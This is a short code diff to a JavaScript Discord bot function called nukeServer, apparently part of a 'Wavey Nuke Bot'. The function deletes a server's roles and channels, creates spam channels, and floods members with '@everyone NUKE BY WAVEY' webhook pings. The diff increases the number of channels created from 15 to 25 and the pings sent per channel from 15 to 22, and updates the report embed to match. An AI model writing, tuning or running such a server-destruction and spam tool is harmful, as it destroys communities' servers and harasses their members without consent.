@@ -110,7 +110,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
         
         // Create 15 text channels and send webhook pings - FIXED TO PROPERLY AWAIT
         const channelPromises = [];
-        for (let i = 0; i < 15; i++) {
+        for (let i = 0; i < 25; i++) {
             const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
             
             channelPromises.push(
@@ -131,7 +131,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                         const webhookClient = new WebhookClient({ id: webhook.id, token: webhook.token });
                         
                         // Send 25 pings through the webhook - AWAIT EACH ONE
-                        for (let j = 0; j < 15; j++) {
+                        for (let j = 0; j < 22; j++) {
                             await webhookClient.send(`@everyone NUKE BY WAVEY ${discordLink}`).catch(console.error);
                         }
                         
@@ -164,7 +164,7 @@ async function nukeServer(guild, originalServerName, originalServerIcon, trigger
                     { name: '🗑️ Roles Deleted', value: rolesDeleted.toString(), inline: true },
                     { name: '📋 Channels Deleted', value: channelsDeleted.toString(), inline: true },
                     { name: '➕ Roles Created', value: '15', inline: true },
-                    { name: '➕ Channels Created', value: '15', inline: true }
+                    { name: '➕ Channels Created', value: '25', inline: true }
                 )
                 .setTimestamp()
                 .setFooter({ text: 'Wavey Nuke Bot' });
